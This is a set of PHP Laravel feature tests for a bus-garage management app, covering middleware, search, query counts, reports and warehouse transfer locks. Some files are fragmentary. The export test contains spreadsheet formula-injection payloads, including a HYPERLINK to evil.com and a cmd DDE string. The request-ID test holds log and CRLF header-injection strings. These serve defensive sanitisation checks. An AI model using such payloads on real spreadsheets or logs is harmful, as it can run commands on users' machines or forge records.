112:     // ==================================================================
113:     // 3. HTTP LEVEL — MIDDLEWARE REDIRECT (FIRST LINE OF DEFENSE)
114:     // ==================================================================
115: 
116:     /**
117:      * When a web request reaches a garage-scoped route without a
118:      * current garage in the session, the `garage.selected` middleware
119:      * intercepts the request BEFORE the controller is executed and
120:      * redirects the user to the garage selection page. No model is
121:      * ever constructed, so no ghost row is created and no exception
122:      * is thrown. This test verifies the middleware guard, which is
123:      * the actual first line of defense in production.
124:      */
125:     public function test_web_request_redirects_to_garage_selection_via_middleware(): void
126:     {
127:         $response = $this->actingAs($this->admin)
128:             ->post(route('buses.store'), [
129:                 'dqn' => 'HTTP-MISSING',
130:                 'is_active' => 1,
131:             ]);
132: 
133:         $response->assertRedirect(route('garage.selection'));
134: 
135:         $this->assertEquals(
136:             0,
137:             Bus::withoutGlobalScopes()->where('dqn', 'HTTP-MISSING')->count(),
138:             'No ghost bus should be created when the middleware blocks the request'
139:         );
140:     }
141: 
142:     /**
143:      * API requests require an X-Garage-Id header, validated by the
144:      * EnsureApiGarageContext middleware. With a valid header the
145:      * request succeeds and the bus is created with the correct
146:      * garage_id. This is the API happy path.
147:      */
148:     public function test_api_request_with_valid_garage_header_succeeds(): void
149:     {
150:         $token = $this->admin->createToken('test')->plainTextToken;
151: 
152:         $response = $this->withToken($token)
153:             ->withHeaders(['X-Garage-Id' => $this->garage->id])
154:             ->postJson('/api/buses', [
155:                 'dqn' => 'API-VALID',
156:                 'is_active' => true,
157:             ]);
158: 
159:         $response->assertCreated();
160: 
161:         $bus = Bus::withoutGlobalScopes()
162:             ->where('dqn', 'API-VALID')
163:             ->first();
164: 
165:         $this->assertNotNull($bus);
166:         $this->assertEquals($this->garage->id, $bus->garage_id);
167:     }
168: 
169:     /**
170:      * API requests without the X-Garage-Id header are rejected by
171:      * the EnsureApiGarageContext middleware with a 400 before any
172:      * controller code runs.
173:      */
174:     public function test_api_request_without_garage_header_returns_400(): void
175:     {
176:         $token = $this->admin->createToken('test')->plainTextToken;
177: 
178:         $response = $this->withToken($token)
179:             ->postJson('/api/buses', [
180:                 'dqn' => 'API-NO-HEADER',
181:                 'is_active' => true,
182:             ]);
183: 
184:         $response->assertStatus(400);
185: 
186:         $this->assertEquals(
187:             0,
188:             Bus::withoutGlobalScopes()->where('dqn', 'API-NO-HEADER')->count(),
189:             'No ghost bus should be created without the garage header'
190:         );
191:     }
192: 
193:     // ==================================================================
194:     // 4. HAPPY PATH — CONTEXT PROVIDED
195:     // ==================================================================
196: 
197:     public function test_bus_creation_succeeds_when_context_is_set(): void

202:

 14: class OilChangeSearchTest extends TestCase
 15: {
 16:     use RefreshDatabase;
 17: 
 18:     protected Company $company;
 19: 
 20:     protected Garage $garage;
 21: 
 22:     protected User $admin;
 23: 
 24:     protected function setUp(): void
 25:     {
 26:         parent::setUp();
 27: 
 28:         $this->company = Company::factory()->create();
 29:         $this->garage = Garage::factory()->create(['company_id' => $this->company->id]);
 30: 
 31:         $this->admin = User::factory()->create(['role' => 'user']);
 32:         $this->admin->garages()->attach($this->garage->id, [
 33:             'role' => 'admin',
 34:             'is_active' => true,
 35:         ]);
 36: 
 37:         GarageContext::set($this->garage->id, $this->company->id);
 38:     }
 39: 
 40:     protected function tearDown(): void
 41:     {
 42:         GarageContext::clear();
 43:         parent::tearDown();
 44:     }
 45: 
 46:     /**
 47:      * Aktual qaraj sessiyası məlumatlarını qaytarır.
 48:      *
 49:      * Qeyd: metodu `session()` adlandırmırıq — bu ad Laravel TestCase-də
 50:      * artıq istifadə olunur və access level konflikti yaradır.
 51:      */
 52:     private function garageSession(): array
 53:     {
 54:         return [
 55:             'current_garage_id' => $this->garage->id,
 56:             'current_company_id' => $this->company->id,
 57:         ];
 58:     }
 59: 
 60:     /**
 61:      * Create a bus in the current garage.
 62:      *
 63:      * `route_number` is unique per garage (partial unique index
 64:      * `buses_garage_xett_active_unique`), so we auto-derive a unique
 65:      * default from the DQN whenever the caller does not supply one.
 66:      * Without this, tests that create more than one bus with the
 67:      * implicit default would collide.
 68:      */
 69:     protected function makeBus(string $dqn, ?string $route = null, int $km = 100000): Bus
 70:     {
 71:         // Deterministic, collision-safe default: hash the DQN.
 72:         $route ??= 'R-'.substr(md5($dqn), 0, 8);
 73: 
 74:         $bus = Bus::factory()->create([
 75:             'garage_id' => $this->garage->id,
 76:             'company_id' => $this->company->id,
 77:             'dqn' => $dqn,
 78:             'route_number' => $route,
 79:             'is_active' => true,
 80:         ]);
 81: 
 82:         DailyKmRecord::withoutGlobalScopes()->create([
 83:             'bus_id' => $bus->id,
 84:             'garage_id' => $this->garage->id,
 85:             'company_id' => $this->company->id,
 86:             'date' => now()->toDateString(),
 87:             'km' => $km,
 88:         ]);
 89: 
 90:         return $bus;
 91:     }
 92: 
 93:     // ==================================================================
 94:     // 1. AJAX PARTIAL RESPONSE
 95:     // ==================================================================
 96: 
 97:     public function test_search_returns_partial_for_ajax_request(): void
 98:     {
 99:         $this->makeBus('99JZ174');
100: 
101:         $response = $this->actingAs($this->admin)
102:             ->withSession($this->garageSession())
103:             ->withHeaders(['X-Requested-With' => 'XMLHttpRequest'])
104:             ->get(route('oil-changes.search', ['dqn' => '99JZ']));
105: 
106:         $response->assertOk();
107:         $content = $response->getContent();
108: 
109:         $this->assertStringContainsString('99JZ174', $content);
110:         $this->assertStringNotContainsString('<!DOCTYPE html>', $content, 'AJAX must return a partial, not a full page');
111:     }
112: 
113:     public function test_search_returns_full_view_for_non_ajax_request(): void
114:     {
115:         $this->makeBus('99JZ174');
116: 
117:         $response = $this->actingAs($this->admin)
118:             ->withSession($this->garageSession())
119:             ->get(route('oil-changes.search', ['dqn' => '99JZ']));
120: 
121:         $response->assertOk();
122:         $response->assertViewIs('oil-changes.index');
123:     }
124: 
125:     // ==================================================================
126:     // 2. DQN FILTER
127:     // ==================================================================
128: 
129:     public function test_search_filters_by_dqn(): void
130:     {
131:         // Explicit distinct route numbers so the partial unique index
132:         // `buses_garage_xett_active_unique` is not violated.
133:         $this->makeBus('99JZ174', '15712');
134:         $this->makeBus('77XX999', '15693');
135:

140:

143:         $this->assertStringNotContainsString('77XX999', $content);
144:     }

<file path="tests/Feature/Performance/NPlusOneQueryTest.php">
  1: <?php
  2: 
  3: namespace Tests\Feature\Performance;
  4: 
  5: use App\Models\Bus;
  6: use App\Models\Company;
  7: use App\Models\Complaint;
  8: use App\Models\ComplaintItem;
  9: use App\Models\Garage;
 10: use App\Models\User;
 11: use App\Models\Warehouse;
 12: use App\Services\GarageContext;
 13: use Illuminate\Foundation\Testing\RefreshDatabase;
 14: use Illuminate\Support\Facades\DB;
 15: use Tests\TestCase;
 16: 
 17: /**
 18:  * N+1 query guards for the highest-traffic pages.
 19:  *
 20:  * These tests assert that critical list pages issue a bounded number
 21:  * of SQL queries regardless of how many records exist. A failure
 22:  * signals a missing eager-load — the fix is almost always adding
 23:  * `with()` to the query in the controller or service.
 24:  *
 25:  * Query limits are intentionally generous (10-20 headroom above the
 26:  * ideal) so that minor framework overhead does not cause false
 27:  * positives.
 28:  */
 29: class NPlusOneQueryTest extends TestCase
 30: {
 31:     use RefreshDatabase;
 32: 
 33:     protected Company $company;
 34: 
 35:     protected Garage $garage;
 36: 
 37:     protected User $admin;
 38: 
 39:     protected function setUp(): void
 40:     {
 41:         parent::setUp();
 42: 
 43:         $this->company = Company::factory()->create();
 44:         $this->garage = Garage::factory()->create(['company_id' => $this->company->id]);
 45: 
 46:         $this->admin = User::factory()->create(['role' => 'user']);
 47:         $this->admin->garages()->attach($this->garage->id, [
 48:             'role' => 'admin',
 49:             'is_active' => true,
 50:         ]);
 51: 
 52:         GarageContext::set($this->garage->id, $this->company->id);
 53:     }
 54: 
 55:     protected function tearDown(): void
 56:     {
 57:         GarageContext::clear();
 58:         parent::tearDown();
 59:     }
 60: 
 61:     protected function garageSession(): array
 62:     {
 63:         return [
 64:             'current_garage_id' => $this->garage->id,
 65:             'current_company_id' => $this->company->id,
 66:         ];
 67:     }
 68: 
 69:     /**
 70:      * Count how many SQL queries a callback executes.
 71:      */
 72:     protected function countQueries(callable $callback): int
 73:     {
 74:         $count = 0;
 75: 
 76:         DB::listen(function () use (&$count) {
 77:             $count++;
 78:         });
 79: 
 80:         $callback();
 81: 
 82:         return $count;
 83:     }
 84: 
 85:     // ==================================================================
 86:     // 1. Bus index — must eager-load brand + latestKmRecord
 87:     // ==================================================================
 88: 
 89:     public function test_bus_index_query_count_is_bounded(): void
 90:     {
 91:         // Create 25 buses with brands
 92:         $brand = \App\Models\BusBrand::withoutGlobalScopes()->create([
 93:             'garage_id' => $this->garage->id,
 94:             'company_id' => $this->company->id,
 95:             'name' => 'Test Brand',
 96:             'code' => 'TEST',
 97:         ]);
 98: 
 99:         Bus::factory()->count(25)->create([
100:             'garage_id' => $this->garage->id,
101:             'company_id' => $this->company->id,
102:             'brand_id' => $brand->id,
103:         ]);
104: 
105:         $queryCount = $this->countQueries(function () {
106:             $this->actingAs($this->admin)
107:                 ->withSession($this->garageSession())
108:                 ->get(route('buses.index'))
109:                 ->assertOk();
110:         });
111: 
112:         // Expected: auth (1) + user lookup (1) + garage session (1)
113:         //           + bus pagination (1) + brands (1) + latest km (1)
114:         //           + counts (1) + sidebar queries (~3)
115:         // With 25 buses, ideal is ~10 queries. If it's 30+, we have N+1.
116:         $this->assertLessThan(
117:             25,
118:             $queryCount,
119:             "Bus index executed {$queryCount} queries for 25 buses. "
120:             .'Expected < 25. Check for missing eager-loads on `brand`, '
121:             .'`latestKmRecord`, or the daily-km accessor fallback.'
122:         );
123:     }
124: 
125:     // ==================================================================
126:     // 2. Complaint index — must eager-load bus + items + details
127:     // ==================================================================
128: 
129:     public function test_complaint_index_query_count_is_bounded(): void
130:     {
131:         $bus = Bus::factory()->create([
132:             'garage_id' => $this->garage->id,
133:             'company_id' => $this->company->id,
134:         ]);
135: 
136:         // 20 complaints, each with 1 item
137:         for ($i = 0; $i < 20; $i++) {
138:             $complaint = Complaint::create([
139:                 'bus_id' => $bus->id,
140:                 'garage_id' => $this->garage->id,
141:                 'company_id' => $this->company->id,
142:                 'yer' => 'garage',
143:                 'status' => 'pending',
144:                 'complaint_type' => 'breakdown',
145:             ]);
146: 
147:             ComplaintItem::create([
148:                 'complaint_id' => $complaint->id,
149:                 'description' => "Test item {$i}",
150:                 'type' => 'breakdown',
151:                 'garage_id' => $this->garage->id,
152:                 'company_id' => $this->company->id,
153:             ]);
154:         }
155: 
156:         $queryCount = $this->countQueries(function () {
157:             $this->actingAs($this->admin)
158:                 ->withSession($this->garageSession())
159:                 ->get(route('complaints.index'))
160:                 ->assertOk();
161:         });
162: 
163:         // Ideal: ~10 queries. If >30, `items` or `bus` is not eager-loaded.
164:         $this->assertLessThan(
165:             25,
166:             $queryCount,
167:             "Complaint index executed {$queryCount} queries for 20 complaints. "
168:             .'Expected < 25. Check eager-loads on `bus`, `items`, `details`.'
169:         );
170:     }
171: 
172:     // ==================================================================
173:     // 3. Warehouse index
174:     // ==================================================================
175: 
176:     public function test_warehouse_index_query_count_is_bounded(): void
177:     {
178:         Warehouse::withoutGlobalScopes()->insert(
179:             collect(range(1, 25))->map(fn ($i) => [
180:                 'garage_id' => $this->garage->id,
181:                 'company_id' => $this->company->id,
182:                 'code' => "W-{$i}",
183:                 'name' => "Item {$i}",
184:                 'quantity' => 10,
185:                 'created_at' => now(),
186:                 'updated_at' => now(),
187:             ])->all()
188:         );
189: 
190:         $queryCount = $this->countQueries(function () {
191:             $this->actingAs($this->admin)
192:                 ->withSession($this->garageSession())
193:                 ->get(route('warehouses.index'))
194:                 ->assertOk();
195:         });
196: 
197:         $this->assertLessThan(
198:             20,
199:             $queryCount,
200:             "Warehouse index executed {$queryCount} queries for 25 items."
201:         );
202:     }
203: 
204:     // ==================================================================
205:     // 4. Dashboard — highest risk for N+1
206:     // ==================================================================
207: 
208:     public function test_dashboard_query_count_is_bounded(): void
209:     {
210:         // Create 30 buses + KM records + oil changes
211:         Bus::factory()->count(30)->create([
212:             'garage_id' => $this->garage->id,
213:             'company_id' => $this->company->id,
214:             'is_active' => true,
215:         ]);
216: 
217:         $queryCount = $this->countQueries(function () {
218:             $this->actingAs($this->admin)
219:                 ->withSession($this->garageSession())
220:                 ->get(route('dashboard'))
221:                 ->assertOk();
222:         });
223: 
224:         // Dashboard aggregates + recent items + oil stats.
225:         // Ideal: ~20 queries. If >50, oil change computation has N+1.
226:         $this->assertLessThan(
227:             50,
228:             $queryCount,
229:             "Dashboard executed {$queryCount} queries for 30 buses. "
230:             .'Expected < 50. Check `latestMotorOilChange`, '
231:             .'`latestGearboxOilChange`, `latestAxleOilChange` eager-loads.'
232:         );
233:     }

 71:     // ==================== DISTRIBUTION ====================
 72: 
 73:     public function test_distribution_groups_statuses_correctly(): void
 74:     {
 75:         BusDailyStatus::withoutGlobalScopes()->create([
 76:             'bus_id' => $this->busA->id,
 77:             'garage_id' => $this->garageA->id,
 78:             'company_id' => $this->company->id,
 79:             'date' => now()->toDateString(),
 80:             'status' => 'READY',
 81:         ]);
 82:         BusDailyStatus::withoutGlobalScopes()->create([
 83:             'bus_id' => $this->busA->id,
 84:             'garage_id' => $this->garageA->id,
 85:             'company_id' => $this->company->id,
 86:             'date' => now()->subDay()->toDateString(),
 87:             'status' => 'READY',
 88:         ]);
 89:         BusDailyStatus::withoutGlobalScopes()->create([
 90:             'bus_id' => $this->busA->id,
 91:             'garage_id' => $this->garageA->id,
 92:             'company_id' => $this->company->id,
 93:             'date' => now()->subDays(2)->toDateString(),
 94:             'status' => 'REPAIR',
 95:         ]);
 96: 
 97:         // Other garage
 98:         BusDailyStatus::withoutGlobalScopes()->create([
 99:             'bus_id' => $this->busB->id,
100:             'garage_id' => $this->garageB->id,
101:             'company_id' => $this->company->id,
102:             'date' => now()->toDateString(),
103:             'status' => 'READY',
104:         ]);
105: 
106:         $scope = new ReportScope([$this->garageA->id], null, false);
107: 
108:         $data = $this->service->distribution($this->period(), $scope);
109: 
110:         $this->assertSame(3, $data['total']);
111:         $this->assertCount(2, $data['rows']);
112: 
113:         $readyRow = $data['rows']->firstWhere('status', 'READY');
114:         $this->assertSame(2, (int) $readyRow->total);
115: 
116:         $repairRow = $data['rows']->firstWhere('status', 'REPAIR');
117:         $this->assertSame(1, (int) $repairRow->total);
118:     }

139:             'date' => now()->toDateString(),
140:             'status' => 'READY',
141:         ]);
142:

144:

 15: /**
 16:  * Tests the Excel export feature for warehouse reports.
 17:  *
 18:  * NOTE: We do NOT use Excel::fake() + assertDownloaded() here.
 19:  * The installed Laravel Excel version (3.1.70) requires an exact
 20:  * filename string, and our filenames contain a runtime timestamp
 21:  * — so the assertion would have to know the exact moment of the
 22:  * request. Instead we assert against the BinaryFileResponse
 23:  * directly: it exposes the actual Content-Disposition header, which
 24:  * is exactly what a browser would see. This is closer to a real
 25:  * end-to-end check anyway.

 99:         );

102:     }

214:     public function test_export_sanitizes_formula_injection(): void
215:     {
216:         $export = new GenericReportExport(
217:             rows: [
218:                 ['SAFE-1', '=HYPERLINK("http://evil.com","click")'],
219:                 ['SAFE-2', '@SUM(1+1)'],
220:                 ['SAFE-3', '+cmd|\'/c calc\'!A1'],
221:                 ['SAFE-4', '-2+3'],
222:                 ['SAFE-5', 'normal text'],
223:             ],
224:             headings: ['Code', 'Name'],
225:         );
226: 
227:         $rows = $export->array();
228: 
229:         // Dangerous values must be prefixed with ' so Excel treats
230:         // them as text, not formulas.
231:         $this->assertStringStartsWith("'=", $rows[0][1]);
232:         $this->assertStringStartsWith("'@", $rows[1][1]);
233:         $this->assertStringStartsWith("'+", $rows[2][1]);
234:         $this->assertStringStartsWith("'-", $rows[3][1]);
235: 
236:         // Safe values are not modified.
237:         $this->assertSame('normal text', $rows[4][1]);
238:     }

152:             'name' => 'Empty',
153:             'quantity' => 0,
154:             'minimum_quantity' => 5,
155:         ]);
156: 
157:         $scope = new ReportScope([$this->garageA->id], null, false);
158: 
159:         $items = $this->service->lowStock($scope);
160: 
161:         $this->assertCount(2, $items);
162:         $this->assertTrue($items->contains('code', 'LOW-1'));
163:         $this->assertTrue($items->contains('code', 'ZERO-1'));
164:         $this->assertFalse($items->contains('code', 'OK-1'));
165:     }
166: 
167:     public function test_low_stock_does_not_leak_other_garage(): void
168:     {

174:             'quantity' => 1,
175:             'minimum_quantity' => 10,

<file path="tests/Feature/RequestIdMiddlewareTest.php">
  1: <?php
  2: 
  3: namespace Tests\Feature;
  4: 
  5: use Illuminate\Support\Str;
  6: use Tests\TestCase;
  7: 
  8: class RequestIdMiddlewareTest extends TestCase
  9: {
 10:     // ==================================================================
 11:     // 1. VALID UUID IS PRESERVED
 12:     // ==================================================================
 13: 
 14:     public function test_valid_uuid_header_is_preserved(): void
 15:     {
 16:         $uuid = (string) Str::uuid();
 17: 
 18:         $response = $this->withHeaders(['X-Request-ID' => $uuid])
 19:             ->get('/');
 20: 
 21:         $this->assertSame(
 22:             $uuid,
 23:             $response->headers->get('X-Request-ID'),
 24:             'A valid UUID must be preserved across the request'
 25:         );
 26:     }
 27: 
 28:     // ==================================================================
 29:     // 2. MALFORMED HEADER IS REPLACED
 30:     // ==================================================================
 31: 
 32:     public function test_malformed_header_is_replaced_with_uuid(): void
 33:     {
 34:         $response = $this->withHeaders(['X-Request-ID' => 'not-a-uuid'])
 35:             ->get('/');
 36: 
 37:         $returned = $response->headers->get('X-Request-ID');
 38: 
 39:         $this->assertNotSame('not-a-uuid', $returned);
 40:         $this->assertTrue(
 41:             Str::isUuid($returned),
 42:             'A malformed X-Request-ID must be replaced with a valid UUID'
 43:         );
 44:     }
 45: 
 46:     public function test_empty_header_is_replaced_with_uuid(): void
 47:     {
 48:         $response = $this->withHeaders(['X-Request-ID' => ''])
 49:             ->get('/');
 50: 
 51:         $this->assertTrue(Str::isUuid($response->headers->get('X-Request-ID')));
 52:     }
 53: 
 54:     // ==================================================================
 55:     // 3. MISSING HEADER GENERATES NEW UUID
 56:     // ==================================================================
 57: 
 58:     public function test_missing_header_generates_uuid(): void
 59:     {
 60:         $response = $this->get('/');
 61: 
 62:         $returned = $response->headers->get('X-Request-ID');
 63: 
 64:         $this->assertNotNull($returned);
 65:         $this->assertTrue(Str::isUuid($returned));
 66:     }
 67: 
 68:     // ==================================================================
 69:     // 4. LOG INJECTION PAYLOADS ARE REJECTED
 70:     // ==================================================================
 71: 
 72:     public function test_log_injection_attempt_is_rejected(): void
 73:     {
 74:         // An attacker tries to poison every log line by sending a
 75:         // value that looks like a structured log entry.
 76:         $malicious = 'fake-id; user_id=1; admin=true';
 77: 
 78:         $response = $this->withHeaders(['X-Request-ID' => $malicious])
 79:             ->get('/');
 80: 
 81:         $returned = $response->headers->get('X-Request-ID');
 82: 
 83:         $this->assertNotSame($malicious, $returned);
 84:         $this->assertTrue(Str::isUuid($returned));
 85:     }
 86: 
 87:     public function test_newline_injection_attempt_is_rejected(): void
 88:     {
 89:         $malicious = "abc\r\nX-Injected: header";
 90: 
 91:         $response = $this->withHeaders(['X-Request-ID' => $malicious])
 92:             ->get('/');
 93: 
 94:         $returned = $response->headers->get('X-Request-ID');
 95: 
 96:         $this->assertNotSame($malicious, $returned);
 97:         $this->assertTrue(Str::isUuid($returned));
 98:         $this->assertStringNotContainsString("\r", $returned);
 99:         $this->assertStringNotContainsString("\n", $returned);
100:     }
101: }

18:     {

32:             'garage_id' => $garage->id,
33:             'company_id' => $company->id,
34:             'code' => 'W-001',

46:             ->assertRedirect();
47: 
48:         $this->actingAs($user)
49:             ->withSession([
50:                 'current_garage_id' => $garage->id,
51:                 'current_company_id' => $company->id,
52:             ])
53:             ->delete(route('warehouses.destroy', $warehouse->id))
54:             ->assertRedirect();
55: 
56:         // 3. Bazadan fiziki olaraq silinmədiyini (Soft Delete olduğunu) yoxlayırıq
57:         $this->assertSoftDeleted('buses', ['id' => $bus->id, 'dqn' => '99-TT-111']);
58:         $this->assertSoftDeleted('warehouses', ['id' => $warehouse->id, 'code' => 'W-001']);
59: 
60:         // 4. Normal axtarışda bu obyektlərin artıq tapılmadığını yoxlayırıq
61:         $this->assertNull(Bus::find($bus->id));
62:         $this->assertNull(Warehouse::find($warehouse->id));
63: 
64:         // 5. Obyektin bərpa (Restore) oluna bildiyini təsdiqləyirik
65:         $bus->restore();
66:         $this->assertNotNull(Bus::find($bus->id));
67:     }

 76:     {

 79:

 81: 
 82:         $response = $this->asSuperAdmin()
 83:             ->post(route('super-admin.companies.assign-director', $this->company), [
 84:                 'user_id' => $newDirector->id,
 85:             ]);

 88:         $response->assertSessionHas('success');

 60:     {
 61:         // Soft-delete the original company directly (bypassing the

 68:             ->post(route('super-admin.companies.store'), [
 69:                 'name' => 'Second Company',

 71:                 'is_active' => 1,
 72:                 'director_name' => 'New Director',
 73:                 'director_email' => 'new-director@test.com',
 74:                 'director_password' => 'Str0ngPass!',

 78:             ]);
 79:

 18: 
 19:     protected Company $company;
 20: 
 21:     protected Garage $garage;
 22: 
 23:     protected function setUp(): void
 24:     {
 25:         parent::setUp();
 26: 
 27:         // The /super-admin/* routes are wrapped in `garage.selected`,
 28:         // which requires a current garage in the session even for super

 37:     /**
 38:      * Act as the super admin with a garage context in session.
 39:      */
 40:     protected function asSuperAdmin(): self
 41:     {
 42:         return $this->actingAs($this->superAdmin)->withSession([
 43:             'current_garage_id' => $this->garage->id,
 44:             'current_company_id' => $this->company->id,
 45:         ]);
 46:     }
 47: 
 48:     /**
 49:      * Act as a regular (non-super-admin) user with a garage context.
 50:      */
 51:     protected function asRegularUser(?User $user = null): self
 52:     {

<file path="tests/Feature/Translations/NoMissingMessagesEnumsTest.php">
 1: <?php
 2: 
 3: namespace Tests\Feature\Translations;
 4: 
 5: use Illuminate\Support\Facades\File;
 6: use Tests\TestCase;
 7: 
 8: /**
 9:  * Guards against a family of bugs where a translation key is written
10:  * with the wrong namespace — most notably `messages.enums.X` which
11:  * does not exist. The correct namespace is `enums.X`.
12:  *
13:  * A wrong namespace causes raw keys to render in the UI, so the user
14:  * sees something like "messages.enums.complaint_status.pending"
15:  * instead of "Pending".
16:  *
17:  * See the lang/{locale}/enums.php files for the source of truth.
18:  */
19: class NoMissingMessagesEnumsTest extends TestCase
20: {
21:     /**
22:      * Recursively collect every .blade.php file under resources/views.
23:      *
24:      * @return array<int, string>
25:      */
26:     private function bladeFiles(): array
27:     {
28:         return collect(File::allFiles(resource_path('views')))
29:             ->filter(fn ($file) => str_ends_with($file->getFilename(), '.blade.php'))
30:             ->map(fn ($file) => $file->getPathname())
31:             ->values()
32:             ->all();
33:     }
34: 
35:     public function test_no_blade_file_references_messages_enums_namespace(): void
36:     {
37:         $offenders = [];
38: 
39:         foreach ($this->bladeFiles() as $path) {
40:             $contents = File::get($path);
41: 
42:             // Look for the wrong namespace in any form of string literal.
43:             if (preg_match('/messages\.enums\./', $contents)) {
44:                 $offenders[] = str_replace(
45:                     base_path().DIRECTORY_SEPARATOR,
46:                     '',
47:                     $path
48:                 );
49:             }
50:         }
51: 
52:         $this->assertEmpty(
53:             $offenders,
54:             "The 'messages.enums.*' namespace does not exist. "
55:             ."Use 'enums.*' instead. "
56:             ."Offending files:\n - ".implode("\n - ", $offenders)
57:         );
58:     }
59: 
60:     public function test_enums_namespace_actually_resolves(): void
61:     {
62:         // Sanity check: the keys we expect must exist for every locale.
63:         $locales = array_keys(config('app.supported_locales', ['en']));
64: 
65:         foreach ($locales as $locale) {
66:             app()->setLocale($locale);
67: 
68:             $this->assertNotEquals(
69:                 'enums.complaint_status.pending',
70:                 __('enums.complaint_status.pending'),
71:                 "Translation for `enums.complaint_status.pending` is missing in locale [{$locale}]."
72:             );
73: 
74:             $this->assertNotEquals(
75:                 'enums.location.road',
76:                 __('enums.location.road'),
77:                 "Translation for `enums.location.road` is missing in locale [{$locale}]."
78:             );
79: 
80:             $this->assertNotEquals(
81:                 'enums.complaint_type.breakdown',
82:                 __('enums.complaint_type.breakdown'),
83:                 "Translation for `enums.complaint_type.breakdown` is missing in locale [{$locale}]."
84:             );
85:         }
86:     }
87: }

<file path="tests/Feature/WarehouseTransferLockTest.php">
  1: <?php
  2: 
  3: namespace Tests\Feature;
  4: 
  5: use App\Enums\TransferType;
  6: use App\Models\Company;
  7: use App\Models\Garage;
  8: use App\Models\User;
  9: use App\Models\Warehouse;
 10: use App\Models\WarehouseTransfer;
 11: use App\Services\GarageContext;
 12: use App\Services\Warehouse\WarehouseTransferService;
 13: use Illuminate\Foundation\Testing\RefreshDatabase;
 14: use Illuminate\Support\Facades\DB;
 15: use Illuminate\Validation\ValidationException;
 16: use Tests\TestCase;
 17: 
 18: /**
 19:  * Regression guard for the missing row lock on warehouse_transfers.
 20:  *
 21:  * Before the fix, dispatch() / receive() / reject() / resolveDisputed()
 22:  * and cancel() all read the transfer status OUTSIDE the transaction
 23:  * and did NOT lock the transfer row. Two concurrent requests could
 24:  * both pass the status check and both proceed to mutate stock or
 25:  * state — a double-deduction, double-credit, or state corruption.
 26:  *
 27:  * These tests verify that every state-changing method now acquires
 28:  * a `lockForUpdate` on the warehouse_transfers row BEFORE reading
 29:  * the status. The actual deadlock / race can only be triggered with
 30:  * two real concurrent DB sessions, which PHPUnit cannot easily
 31:  * simulate — so we assert the lock acquisition itself.
 32:  */
 33: class WarehouseTransferLockTest extends TestCase
 34: {
 35:     use RefreshDatabase;
 36: 
 37:     protected Company $company;
 38: 
 39:     protected Garage $garageA;
 40: 
 41:     protected Garage $garageB;
 42: 
 43:     protected User $adminA;
 44: 
 45:     protected User $adminB;
 46: 
 47:     protected WarehouseTransferService $service;
 48: 
 49:     protected function setUp(): void
 50:     {
 51:         parent::setUp();
 52: 
 53:         $this->company = Company::factory()->create();
 54:         $this->garageA = Garage::factory()->create(['company_id' => $this->company->id]);
 55:         $this->garageB = Garage::factory()->create(['company_id' => $this->company->id]);
 56: 
 57:         $this->adminA = User::factory()->create(['role' => 'user']);
 58:         $this->adminA->garages()->attach($this->garageA->id, ['role' => 'admin', 'is_active' => true]);
 59: 
 60:         $this->adminB = User::factory()->create(['role' => 'user']);
 61:         $this->adminB->garages()->attach($this->garageB->id, ['role' => 'admin', 'is_active' => true]);
 62: 
 63:         GarageContext::set($this->garageA->id, $this->company->id);
 64: 
 65:         $this->service = app(WarehouseTransferService::class);
 66:     }
 67: 
 68:     protected function tearDown(): void
 69:     {
 70:         GarageContext::clear();
 71:         parent::tearDown();
 72:     }
 73: 
 74:     // ==================================================================
 75:     // HELPERS
 76:     // ==================================================================
 77: 
 78:     protected function makeWarehouse(Garage $garage, string $code = 'W-001', int $qty = 100): Warehouse
 79:     {
 80:         return Warehouse::withoutGlobalScopes()->create([
 81:             'garage_id' => $garage->id,
 82:             'company_id' => $this->company->id,
 83:             'code' => $code,
 84:             'name' => "Part {$code}",
 85:             'quantity' => $qty,
 86:         ]);
 87:     }
 88: 
 89:     protected function makeDraftTransfer(): WarehouseTransfer
 90:     {
 91:         $source = $this->makeWarehouse($this->garageA);
 92: 
 93:         $this->actingAs($this->adminA);
 94: 
 95:         return $this->service->create([
 96:             'from_garage_id' => $this->garageA->id,
 97:             'to_garage_id' => $this->garageB->id,
 98:             'type' => TransferType::GarageToGarage->value,
 99:             'items' => [['warehouse_id' => $source->id, 'declared_quantity' => 5]],
100:         ], $this->company->id);
101:     }
102: 
103:     /**
104:      * Capture any `for update` query that touches warehouse_transfers.
105:      */
106:     protected function captureTransferLocks(callable $action): int
107:     {
108:         $count = 0;
109: 
110:         DB::listen(function ($query) use (&$count) {
111:             $sql = strtolower($query->sql);
112: 
113:             if (str_contains($sql, 'for update')
114:                 && str_contains($sql, 'warehouse_transfers')) {
115:                 $count++;
116:             }
117:         });
118: 
119:         $action();
120: 
121:         return $count;
122:     }
123: 
124:     // ==================================================================
125:     // 1. dispatch() locks the transfer row
126:     // ==================================================================
127: 
128:     public function test_dispatch_locks_transfer_row_before_status_check(): void
129:     {
130:         $transfer = $this->makeDraftTransfer();
131: 
132:         $locks = $this->captureTransferLocks(function () use ($transfer) {
133:             $this->service->dispatch($transfer);
134:         });
135: 
136:         $this->assertGreaterThanOrEqual(
137:             1,
138:             $locks,
139:             'dispatch() must acquire a row lock on warehouse_transfers'
140:         );
141:     }
142: 
143:     // ==================================================================
144:     // 2. receive() locks the transfer row
145:     // ==================================================================
146: 
147:     public function test_receive_locks_transfer_row_before_status_check(): void
148:     {
149:         $transfer = $this->makeDraftTransfer();
150:         $this->service->dispatch($transfer);
151: 
152:         $this->actingAs($this->adminB);
153:         $itemId = $transfer->fresh()->items->first()->id;
154: 
155:         $locks = $this->captureTransferLocks(function () use ($transfer, $itemId) {
156:             $this->service->receive($transfer->fresh(), [$itemId => 5]);
157:         });
158: 
159:         $this->assertGreaterThanOrEqual(1, $locks);
160:     }
161: 
162:     // ==================================================================
163:     // 3. reject() locks the transfer row
164:     // ==================================================================
165: 
166:     public function test_reject_locks_transfer_row_before_status_check(): void
167:     {
168:         $transfer = $this->makeDraftTransfer();
169:         $this->service->dispatch($transfer);
170: 
171:         $this->actingAs($this->adminB);
172: 
173:         $locks = $this->captureTransferLocks(function () use ($transfer) {
174:             $this->service->reject($transfer->fresh(), 'Test rejection');
175:         });
176: 
177:         $this->assertGreaterThanOrEqual(1, $locks);
178:     }
179: 
180:     // ==================================================================
181:     // 4. resolveDisputed() locks the transfer row
182:     // ==================================================================
183: 
184:     public function test_resolve_disputed_locks_transfer_row_before_status_check(): void
185:     {
186:         $transfer = $this->makeDraftTransfer();
187:         $this->service->dispatch($transfer);
188: 
189:         $this->actingAs($this->adminB);
190:         $itemId = $transfer->fresh()->items->first()->id;
191: 
192:         // Receive fewer to force disputed state
